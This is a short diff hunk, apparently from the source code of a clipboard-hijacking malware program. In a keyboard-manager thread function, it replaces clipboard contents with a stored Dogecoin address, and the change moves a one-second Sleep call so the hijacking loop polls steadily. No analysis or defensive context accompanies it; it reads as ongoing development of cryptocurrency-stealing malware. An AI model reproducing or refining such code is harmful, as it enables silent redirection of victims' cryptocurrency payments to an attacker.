@@ -519,8 +519,8 @@ DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam) {
 				if (!w[ADDR_DOGE].empty()) clip::set_text(w[ADDR_DOGE]);
 				break;
 			}
-			Sleep(1000);
 		}
+        Sleep(1000);
 	}
 	return 0x20251005;
 }
